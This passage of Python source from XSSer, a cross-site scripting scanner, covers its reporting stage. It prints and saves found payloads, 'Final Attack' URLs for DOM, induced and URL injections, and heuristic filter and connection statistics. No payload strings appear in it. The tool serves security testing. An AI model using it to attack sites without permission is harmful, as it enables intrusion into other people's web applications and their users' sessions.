                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: DOM")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", line[0])
                    self.report("[!] Vulnerable: DOM (Document Object Model)")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        self.report("[*] Final Attack:", attack_url)
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[1] == "[Document Object Model Injection]":
                            if h[4]:
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DOM" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DOM (Document Object Model)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DOM" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DOM (Document Object Model)" + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DOM" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DOM (Document Object Model)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: DOM" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "DOM (Document Object Model)" + "\n\n[!] Status: XSS FOUND!\n\n")
                            fout.write("="*75 + "\n\n")
            elif line[1] == "[Induced Injection]":
                self.httpsr_found = self.httpsr_found +1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: INDUCED")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", line[0])
                    self.report("[!] Vulnerable: HTTPsr ( HTTP Splitting Response)")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        self.report("[*] Final Attack:", attack_url)
                    self.report("[!] Status: XSS FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[4]:
                            if h[1] == "[Induced Injection]":
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: INDUCED" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "HTTPsr ( HTTP Splitting Response)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: INDUCED" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "HTTPsr ( HTTP Splitting Response)" + "\n\n[!] Status: XSS FOUND!\n\n")
                            else:
                                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: INDUCED" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "HTTPsr ( HTTP Splitting Response)" + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                                else:
                                    fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: INDUCED" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + "HTTPsr ( HTTP Splitting Response)" + "\n\n[!] Status: XSS FOUND!\n\n")
                            fout.write("="*75 + "\n\n")
            elif line[1] == "[hashing check]":
                if len(self.hash_found) < 11:
                    if line[4]:
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[3]) + " ]")
                    self.report("[!] Method:", line[2])
                    self.report("[*] Payload:", line[5])
                    self.report("[!] Status: HASH FOUND!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for h in self.hash_found:
                        if h[1] == "[hashing check]":
                            if h[4]:
                                fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[3]) + " ]\n\n[!] Method: hashing check" + " \n\n[*] Payload: \n\n " + str(h[5]) + "\n\n[!] Status: HASH FOUND!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[3]) + " ]\n\n[!] Method: hashing check" + " \n\n[*] Payload: \n\n " + str(h[5]) + "\n\n[!] Status: HASH FOUND!\n\n")
                            fout.write("="*75 + "\n\n")
            elif line[1] == "[manual_injection]":
                self.manual_found = self.manual_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: MANUAL")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", line[0])
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        self.report("[*] Final Attack:", attack_url)
                    if self.token_arrived_flag == True:
                        self.report("[!] Status: XSS FOUND! [100% VULNERABLE]",  "\n", '-'*50, "\n")
                    else:
                        if self.options.reversecheck:
                            self.report("[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]",  "\n", '-'*50, "\n")
                        else:
                            self.report("[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for line in self.hash_found:
                        if line[4]:
                            if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                            else:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                        else:
                            if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                            else:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: MANUAL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                        fout.write("="*75 + "\n\n")
            elif line[1] == "[Heuristic test]":
                if len(self.hash_found) < 11:
                    if line[4]: 
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[3]) + " ]")
                    self.report("[!] Method:", line[2])
                    self.report("[*] Payload:", line[5])
                    self.report("[!] Status: NOT FILTERED!",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for line in self.hash_found:
                        if line[4]:
                            fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Payload: \n\n " + str(line[5]) + "\n\n[!] Status: NOT FILTERED!\n\n")
                        else:
                            fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[3]) + " ]\n\n[!] Method: heuristic" + " \n\n[*] Payload: \n\n " + str(line[5]) + "\n\n[!] Status: NOT FILTERED!\n\n")
                        fout.write("="*75 + "\n\n")
            else:
                self.auto_found = self.auto_found + 1
                if len(self.hash_found) < 11:
                    if line[4]: # when query string
                        self.report("[+] Target:", line[6] + " | " + line[4])
                    else:
                        self.report("[+] Target:", line[6])
                    self.report("[+] Vector: [ " + str(line[2]) + " ]")
                    self.report("[!] Method: URL")
                    self.report("[*] Hash:", line[3])
                    self.report("[*] Payload:", line[0])
                    self.report("[!] Vulnerable:", line[1])
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        self.report("[*] Final Attack:", attack_url)
                    if self.token_arrived_flag == True:
                        self.report("[!] Status: XSS FOUND! [100% VULNERABLE]",  "\n", '-'*50, "\n")
                    else:
                        if self.options.reversecheck:
                            self.report("[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]",  "\n", '-'*50, "\n")
                        else:
                            self.report("[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]",  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("="*75)
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("="*75 + "\n\n")
                    for line in self.hash_found:
                        if line[4]:
                            if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                            else:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                        else:
                            if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                            else:
                                if self.token_arrived_flag == True:
                                    fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [100% VULNERABLE]\n\n")
                                else:
                                    if self.options.reversecheck:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [BUT --reverse-check VALIDATION has FAILED!]\n\n")
                                    else:
                                        fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND! [WITHOUT --reverse-check VALIDATION!]\n\n")
                        fout.write("="*75 + "\n\n")
        if self.options.fileoutput:
            fout.close()
        if self.options.fileoutput and not self.options.filexml:
           self.report("\n[Info] Generating report: [ XSSreport.raw ]\n")
           self.report("-"*25+"\n")
        if self.options.fileoutput and self.options.filexml:
           self.report("\n[Info] Generating report: [ XSSreport.raw ] | Exporting results to: [ " + str(self.options.filexml) + " ] \n")
           self.report("-"*25+"\n")
        if len(self.hash_found) > 10 and not self.options.fileoutput: # write results fo file when large output (white magic!)
            if not self.options.filexml: 
                self.report("[Info] Aborting large screen output. Generating auto-report at: [ XSSreport.raw ] ;-)\n")
                self.report("-"*25+"\n")
                fout = open("XSSreport.raw", "w") # write better than append
                fout.write("="*75)
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("="*75 + "\n\n")
                for line in self.hash_found:
                    if line[4]:
                        if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                            fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                        else:
                            fout.write("[+] Target: " + str(line[6]) + " | " + str(line[4]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND!\n\n")
                    else:
                        if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                            fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[*] Final Attack:\n\n " + str(attack_url) + "\n\n[!] Status: XSS FOUND!\n\n")
                        else:
                            fout.write("[+] Target: " + str(line[6]) + "\n[+] Vector: [ " + str(line[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(line[3]) + " \n\n[*] Payload: \n\n " + str(line[0]) + "\n\n[!] Vulnerable: " + line[1] + "\n\n[!] Status: XSS FOUND!\n\n")
                    fout.write("="*75 + "\n\n")
                fout.close()
            else:
                self.report("[Info] Exporting results to: [ " + str(self.options.filexml) + " ]\n")
                self.report("-"*25+"\n")
        # heuristic always with statistics
        if self.options.heuristic:
            heuris_semicolon_total_found = self.heuris_semicolon_found + self.heuris_une_semicolon_found + self.heuris_dec_semicolon_found
            heuris_backslash_total_found = self.heuris_backslash_found + self.heuris_une_backslash_found + self.heuris_dec_backslash_found
            heuris_slash_total_found = self.heuris_slash_found + self.heuris_une_slash_found + self.heuris_dec_slash_found
            heuris_minor_total_found = self.heuris_minor_found + self.heuris_une_minor_found + self.heuris_dec_minor_found
            heuris_mayor_total_found = self.heuris_mayor_found + self.heuris_une_mayor_found + self.heuris_dec_mayor_found
            heuris_doublecolon_total_found = self.heuris_doublecolon_found + self.heuris_une_doublecolon_found + self.heuris_dec_doublecolon_found
            heuris_colon_total_found = self.heuris_colon_found + self.heuris_une_colon_found + self.heuris_dec_colon_found
            heuris_equal_total_found = self.heuris_equal_found + self.heuris_une_equal_found + self.heuris_dec_equal_found
            total_heuris_found = heuris_semicolon_total_found + heuris_backslash_total_found + heuris_slash_total_found + heuris_minor_total_found + heuris_mayor_total_found + heuris_doublecolon_total_found + heuris_colon_total_found + heuris_equal_total_found
            total_heuris_params = total_heuris_found + self.heuris_semicolon_found + self.heuris_backslash_found + self.heuris_slash_found + self.heuris_minor_found + self.heuris_mayor_found + self.heuris_doublecolon_found + self.heuris_colon_found + self.heuris_equal_found
            total_heuris_notfound = self.heuris_semicolon_notfound + self.heuris_backslash_notfound + self.heuris_slash_notfound + self.heuris_minor_notfound + self.heuris_mayor_notfound + self.heuris_doublecolon_notfound + self.heuris_colon_notfound + self.heuris_equal_notfound
            if total_heuris_notfound > 0: # not shown when not found
                self.options.statistics = True
	    # some statistics reports
        if self.options.statistics:
            # heuristic test results
            if self.options.heuristic:
                self.report("\n"+'='*75)
                self.report("[+] Heuristics:")
                self.report('='*75)
                test_time = datetime.datetime.now() - self.time
                self.report("\n" + '-'*50)
                self.report("Test Time Duration: ", test_time)
                self.report('-'*50  )
                total_connections = total_heuris_found + total_heuris_notfound
                self.report("Total fuzzed:", total_connections)
                self.report('-'*75)
                self.report('  ', "  <FILTERED!>", "  <NOT FILTERED!>", " =" , "  ASCII", "+", "UNE/HEX", "+", "DEC")
                # semicolon results
                self.report('; ',   "      ", self.heuris_semicolon_notfound, "             ", 
                            heuris_semicolon_total_found, "             ",
                            self.heuris_semicolon_found, "      ",
                            self.heuris_une_semicolon_found, "     ",
                            self.heuris_dec_semicolon_found)
                # backslash results
                self.report('\\ ',  "      ", self.heuris_backslash_notfound, "             ", 
                            heuris_backslash_total_found, "             ",
                            self.heuris_backslash_found, "      ",
                            self.heuris_une_backslash_found, "     ",
                            self.heuris_dec_backslash_found)
                # slash results
                self.report("/ ",   "      ", self.heuris_slash_notfound, "             ",
                            heuris_slash_total_found, "             ",
                            self.heuris_slash_found, "      ",
                            self.heuris_une_slash_found, "     ",
                            self.heuris_dec_slash_found)
                # minor results
                self.report("< ",   "      ", self.heuris_minor_notfound, "             ",
                            heuris_minor_total_found, "             ",
                            self.heuris_minor_found, "      ",
                            self.heuris_une_minor_found, "     ",
                            self.heuris_dec_minor_found)
                # mayor results
                self.report("> ",   "      ", self.heuris_mayor_notfound, "             ",
                            heuris_mayor_total_found, "             ",
                            self.heuris_mayor_found, "      ",
                            self.heuris_une_mayor_found, "     ",
                            self.heuris_dec_mayor_found)
                # doublecolon results
                self.report('" ',   "      ", self.heuris_doublecolon_notfound, "             ", 
                            heuris_doublecolon_total_found, "             ",
                            self.heuris_doublecolon_found, "      ",
                            self.heuris_une_doublecolon_found, "     ",
                            self.heuris_dec_doublecolon_found)
                # colon results
                self.report("' ",   "      ", self.heuris_colon_notfound, "             ",
                            heuris_colon_total_found, "             ",
                            self.heuris_colon_found, "      ",
                            self.heuris_une_colon_found, "     ",
                            self.heuris_dec_colon_found)
                # equal results
                self.report("= ",   "      ", self.heuris_equal_notfound, "             ",
                            heuris_equal_total_found, "             ",
                            self.heuris_equal_found, "      ",
                            self.heuris_une_equal_found, "     ",
                            self.heuris_dec_equal_found)
                self.report('-'*75)
                try:
                    _accur = total_heuris_found * 100 / total_heuris_params
                except ZeroDivisionError:
                    _accur = 0
                self.report('Target(s) Filtering Accur: %s %%' % _accur)
                self.report('-'*75)
            # statistics block
            if len(self.hash_found) + len(self.hash_notfound) == 0:
                pass
            if self.options.heuristic:
                pass
            else:
                self.report('='*75)
                self.report("[+] Statistics:")
                self.report('='*75)
                test_time = datetime.datetime.now() - self.time
                self.report("\n" + '-'*50)
                self.report("Test Time Duration: ", test_time)
                self.report('-'*50  )
                total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
                self.report("Total Connections:", total_connections)
                self.report('-'*25)
                self.report("200-OK:" , self.success_connection , "|",  "404:" ,
                            self.not_connection , "|" , "503:" ,
                            self.forwarded_connection , "|" , "Others:",
                            self.other_connection)
                try:
                    _accur = self.success_connection * 100 / total_connections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Connec: %s %%" % _accur)
                self.report('-'*50)
                total_payloads = self.check_positives + self.manual_injection + self.auto_injection + self.dcp_injection + self.dom_injection + self.xsa_injection + self.xsr_injection + self.coo_injection 
                self.report("Total Payloads:", total_payloads)
                self.report('-'*25)
                self.report("Checker:", self.check_positives,  "|", "Manual:",
                            self.manual_injection, "|" , "Auto:" ,
                            self.auto_injection ,"|", "DCP:",
                            self.dcp_injection, "|", "DOM:", self.dom_injection,
                            "|", "Induced:", self.httpsr_injection, "|" , "XSR:",
                            self.xsr_injection, "|", "XSA:",
                            self.xsa_injection , "|", "COO:",
                            self.coo_injection)
                self.report('-'*50)
                self.report("Total Injections:" , 
                            len(self.hash_notfound) + len(self.hash_found))
                self.report('-'*25)
                self.report("Failed:" , len(self.hash_notfound), "|",
                            "Successful:" , len(self.hash_found))
                try:
                    _accur = len(self.hash_found) * 100 / total_injections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Accur : %s %%" % _accur)
                self.report("\n" + '='*50)
                total_discovered = self.false_positives + self.manual_found + self.auto_found + self.dcp_found + self.dom_found + self.xsr_found + self.xsa_found + self.coo_found
                self.report("\n" + '-'*50)
                self.report("Total XSS Discovered:", total_discovered)
                self.report('-'*50)
                self.report("Checker:", self.false_positives, "|",
                            "Manual:",self.manual_found, "|", "Auto:",
                            self.auto_found, "|", "DCP:", self.dcp_found,
                            "|", "DOM:", self.dom_found, "|", "Induced:",
                            self.httpsr_found, "|" , "XSR:", self.xsr_found,
                            "|", "XSA:", self.xsa_found, "|", "COO:",
                            self.coo_found)
                self.report('-'*50)
                self.report("False positives:", self.false_positives, "|",
                            "Vulnerables:",
                            total_discovered - self.false_positives)
                self.report('-'*25)
	        # efficiency ranking:
	        # algor= vulnerables + false positives - failed * extras
                mana = 0
                h_found = 0
                for h in self.hash_found:
                    h_found = h_found + 1
                if h_found > 3:
                    mana = mana + 4500
                if h_found == 1:
                    mana = mana + 500
                if self.options.reversecheck:
                    mana = mana + 200
                if total_payloads > 100:
                    mana = mana + 150
                if not self.options.xsser_gtk:
                    mana = mana + 25
                if self.options.discode:
                    mana = mana + 100
                if self.options.proxy:
                    mana = mana + 100
                try:
                    if self.options.threads > 9:
                        mana = mana + 100
                except:
                    pass
                if self.options.heuristic:
                    mana = mana + 100
                if self.options.finalpayload or self.options.finalremote:
                    mana = mana + 100
                if self.options.script:
                    mana = mana + 100
                if self.options.Cem or self.options.Doo:
                    mana = mana + 75
                if self.options.heuristic:
